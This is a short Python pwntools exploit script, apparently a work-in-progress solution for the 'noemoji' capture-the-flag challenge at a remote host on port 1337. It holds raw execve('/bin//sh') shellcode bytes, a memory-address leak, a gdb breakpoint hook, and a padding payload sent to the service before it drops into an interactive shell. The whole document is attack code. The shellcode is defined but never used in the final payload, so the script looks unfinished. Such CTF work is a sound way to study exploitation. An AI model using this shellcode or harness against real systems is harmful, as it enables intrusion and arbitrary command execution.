from pwn import *
import sys

context.arch = "amd64"
remote_ip,port = 'noemoji.hackable.software','1337'
binary = ['./main']

reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)

if(len(sys.argv) > 1):
    io=remote(remote_ip,port)
    context.noptrace  = True
else:
    io=process(binary)

def mmap():
    sla("beer\n\n",'b')

def shell(shellcode):
    sla("beer\n\n",'h')
    sl(shellcode.ljust(0x1000,'\x00'))

execve = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
if __name__ == "__main__":
    mmap()
    reu("@")
    map_addr = int(rel()[:-1],16)
    log.info("map_addr = " + hex(map_addr))
    mmap()
    gdb.attach(io,"""
        b*0x5555555557b4
    c""")
    shell('a'*0x200 +"bbb")
    io.interactive()
